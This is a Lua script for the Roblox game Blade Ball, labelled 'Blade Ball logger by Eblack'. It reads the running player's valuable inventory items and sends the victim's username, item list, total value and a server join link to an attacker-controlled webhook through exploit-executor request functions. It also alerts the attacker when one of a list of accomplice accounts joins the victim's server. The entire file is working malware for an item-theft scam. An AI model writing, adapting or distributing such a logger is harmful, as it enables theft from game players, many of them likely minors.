-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // CONFIGURATION
local auth_token = "EBK-SS-A" 
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local categories = {"Sword", "Emote", "Explosion"}

local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri","Andrewdagoatya","EmmaQueen2024_YT","Ech0_Night2010YT","EpicClawSilver","PhoenixSilver2011","XxElla_R0CK3TXX"}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if webhook == "" then return end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local idx = 1
    while number >= 1000 and idx < #suffixes do
        number = number / 1000
        idx = idx + 1
    end
    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
end

-- // SCAN INVENTAIRE
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildMap(cat)
    local m = {}
    local d = rapData[cat]
    if not d then return m end
    for k, r in pairs(d) do
        local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
        if s and type(dec) == "table" then
            for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r break end end
        end
    end
    return m
end

local itemsFound = {}
local totalRAP = 0
for _, cat in ipairs(categories) do
    local map = buildMap(cat)
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            local rap = map[info.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsFound, {Name = info.Name, RAP = rap})
            end
        end
    end
end

-- // FONCTION ENVOI (EMBED ORIGINAL)
local function sendWebhook(isJoin)
    local isGoodHit = totalRAP >= 500
    local grouped = {}
    for _, item in ipairs(itemsFound) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local listText = ""
    for name, count in pairs(grouped) do listText = listText .. name .. " (x" .. count .. ")\n" end

    local payload = {
        ["auth_token"] = auth_token,
        ["username"] = isJoin and (isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT") or "⚪ Eblack - SERVER HIT",
        ["content"] = isJoin and ((ping == "Yes" and "@everyone " or "") .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')") or nil,
        ["embeds"] = {{
            ["title"] = isJoin and (isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯") or "⚪ Server Hit 🎉",
            ["color"] = isGoodHit and 65280 or 8323327,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Total RAP 💰:", value = "**" .. formatNumber(totalRAP) .. "**", inline = true},
                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list 📝:", value = listText ~= "" and listText or "None", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }

    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // EXECUTION
if #itemsFound > 0 then
    -- 1. Envoi immédiat du scan
    sendWebhook(true)

    -- 2. Attente de tes comptes pour le "Server Hit"
    local hasSentHit = false
    local function check(player)
        if not hasSentHit and table.find(users, player.Name) then
            hasSentHit = true
            sendWebhook(false) -- Envoie l'embed blanc "Server Hit"
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do check(p) end
    Players.PlayerAdded:Connect(check)
end
